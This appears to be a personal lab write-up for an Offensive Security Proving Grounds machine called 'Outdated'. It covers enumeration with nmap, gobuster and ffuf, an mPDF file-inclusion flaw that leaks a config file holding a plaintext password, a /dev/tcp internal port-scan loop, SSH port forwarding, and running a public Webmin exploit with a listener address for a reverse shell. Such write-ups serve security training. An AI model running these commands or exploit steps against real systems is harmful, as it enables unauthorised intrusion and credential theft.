---
tags: [ProvingGround]
---

5/6/25
Outdated

---------------------------

## 1. PORT      STATE    SERVICE          VERSION
22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp    open     http             Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Convert HTML to PDF Online
10000/tcp filtered snet-sensor-mgmt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May  6 15:22:46 2025 -- 1 IP address (1 host up) scanned in 11.07 seconds
## 2. Site is a HTML to PDF Online converter.
## 3. gobuster dir -u http://192.168.240.232 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
## 4. found http://192.168.240.232/vendor
## 5. Change log indicates mPDF 6.0 running
## 6. Found remote file inclusion vulnerability https://github.com/mpdf/mpdf/issues/356
## 7. found svc-account:x:1000:1000::/home/svc-account:/bin/bash
## 8.  ffuf -w /opt/payloads/seclist/Discovery/Web-Content/raft-small-words.txt -u "http://outdated.pg/FUZZ"
## 9. $ ffuf -w /opt/payloads/seclist/Discovery/Web-Content/raft-small-words.txt -u "http://outdated.pg/config/FUZZ" -e .php
## 10. View config.php file  <annotation file="/var/www/html/config/config.php" content="/var/www/html/config/config.php" icon="Graph" title="Attached File: /var/www/html/config/config.php" pos-x="195" />
## 11.<?php
/* todo: check if still required
```bash
$servername = "localhost";
```
```bash
$username = "svc-account";
```
```bash
$password = "best&_#Password@2021!!!";
```
```bash
$dbname = "project";
```

```bash
$conn = new mysqli($servername, $username, $password, $dbname);
```

if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
*/
## 12. Look at open ports on host - for  i  in {1..65535}; do (echo > /dev/tcp/127.0.0.1/$i) >/dev/null 2>&1 && echo  $i is open; done
## 13. After seeing port 10000 is opne forward in to local host - ssh -fN -L 10000:localhost:10000 svc-account@192.168.208.232
## 14. View at https://localhost:10000
## 15. cat /etc/webmin/version 1.996
## 16. https://www.exploit-db.com/exploits/50998.
## 17.  python3 50998.py -t https://localhost -u svc-account -p 'best&_#Password@2021!!!' -l 192.168.45.235 -lp 4444
